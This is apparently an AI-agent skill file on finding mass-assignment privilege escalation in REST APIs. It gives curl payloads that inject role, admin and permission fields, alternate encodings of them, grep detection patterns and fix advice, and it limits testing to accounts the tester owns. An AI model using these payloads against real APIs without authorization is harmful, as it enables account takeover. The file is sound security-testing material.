---
name: detecting-api-mass-assignment-role-escalation
description: >-
  Detect privilege escalation through unbound request fields that set roles, status, or ownership.
---

# SKILL: Detect privilege escalation through unbound request fields that set roles, status, or ownership.

> **AI LOAD INSTRUCTION**: Load when assessing whether API create/update endpoints bind attacker-supplied fields to the model.

## 0. RELATED ROUTING
- [exploiting-mass-assignment-in-rest-apis](#) for ORM-level auto-binding abuse
- [detecting-broken-object-property-level-authorization](#) for BOPLA response over-exposure
- [testing-for-broken-access-control](#) for privilege-escalation confirmation

## 1. THE FLAW

Frameworks map request JSON directly onto model attributes. Any writable field the developer
did not intend to expose becomes attacker-controlled. Highest-value targets:

- `role`, `isAdmin`, `admin`, `permissions`, `scope`, `groupIds`
- `status`, `verified`, `emailVerified`, `approved`
- `ownerId`, `tenantId`, `orgId`, `accountId`
- `balance`, `credits`, `plan`, `price`, `discountPct`
- `userId`, `createdBy`, `id` (record takeover)

## 2. DISCOVER THE WRITABLE SURFACE

Collect the accepted fields from the app you own:

```
# documented shape
curl -s https://api.example.com/openapi.json | python3 -m json.tool | less

# error-driven discovery: note which field names produce validation errors
curl -s -X PATCH https://api.example.com/v1/users/me -H "Authorization: Bearer $T" \
  -H 'Content-Type: application/json' -d '{"displayName":"a"}'
```

Look for behavior differences when sending unknown keys. Strict schemas (`additionalProperties:
false`) reject; permissive ones echo the field or silently store it.

## 3. INJECT PRIVILEGE FIELDS

Create a throwaway account you own (unprivileged) and attempt self-escalation only.

```
curl -s -X POST https://api.example.com/v1/users \
  -H "Authorization: Bearer $LOW_PRIV_TOKEN" -H 'Content-Type: application/json' \
  -d '{"email":"me@example.test","displayName":"Me","role":"admin"}'

curl -s -X PATCH https://api.example.com/v1/users/me \
  -H "Authorization: Bearer $LOW_PRIV_TOKEN" -H 'Content-Type: application/json' \
  -d '{"permissions":["billing:write"],"isAdmin":true,"verified":true}'

# alternate encodings of the same intent
-d '{"role":{"$ne":"user"}}'
-d '{"roles":["user","admin"]}'
-d '{"ROLE":"ADMIN"}'
```

## 4. CONFIRM IMPACT SAFELY

Do not attempt actions on other users' data. Confirm by reading back your own account:

```
curl -s https://api.example.com/v1/me -H "Authorization: Bearer $LOW_PRIV_TOKEN" \
  | python3 -c 'import json,sys; d=json.load(sys.stdin); print(d.get("role"), d.get("permissions"))'
```

If `role` is now `admin` but an admin-only endpoint still rejects the call, the finding is
"stored privilege claim injection" (a real integrity issue) rather than full escalation.
Only then attempt one benign admin-only read that returns your own data.

## 5. RELATED VECTORS

- **Query-string and form-encoded binding** - `?role=admin` on a `PUT`.
- **Array/object nesting** - `{"user":{"role":"admin"}}` or `{"data":{"attributes":{...}}}`.
- **PATCH vs PUT semantics** - `PUT` often clears then binds all fields, `PATCH` binds only present.
- **Bulk/batch endpoints** - `POST /v1/users` accepting an array bypasses per-element allowlists.
- **GraphQL input types** - mutation input object containing `role`, with no server-side filter.

## 6. DETECTION SIGNATURES

```
grep -nE 'req\.(body|query)\b.*role|request\.(body|JSON)\b.*is_admin' -r src/
grep -nE 'pick\(|only\(|allowed_fields|fields\s*=' -r src/
grep -nE 'Object\.assign\(.*req\.body|setattr\(.*,.*\*\*' -r src/
```

Flag any controller that persists `req.body` directly, and any ORM `update()` fed from a
whitelisted-but-unreviewed field list.

## 7. FIX RECOMMENDATIONS

1. Explicit allowlists per endpoint and per operation; reject unknown properties.
2. Enforce schema validation at the boundary (OpenAPI/JSON Schema, `additionalProperties:false`).
3. Never bind security context from the body; derive `tenantId`/`ownerId` from the session.
4. Strip privileged fields in the ORM layer too, as defense in depth.
5. Log rejected unknown fields and alert on attempts to set role or ownership fields.

## 8. RESPONSIBLE TESTING

Only create or modify records belonging to accounts you own or have written authorization to
test. Escalation must be proven on your own account, and any admin-only access limited to
reading your own data. Do not touch other users' records, and do not leave elevated accounts
behind; remove test data when finished.

## Sources
- CWE-915: https://cwe.mitre.org/data/definitions/915.html
- OWASP API3 (BOPLA): https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/
- OWASP Mass Assignment: https://owasp.org/www-community/attacks/Mass_assignment
- PortSwigger: https://portswigger.net/web-security
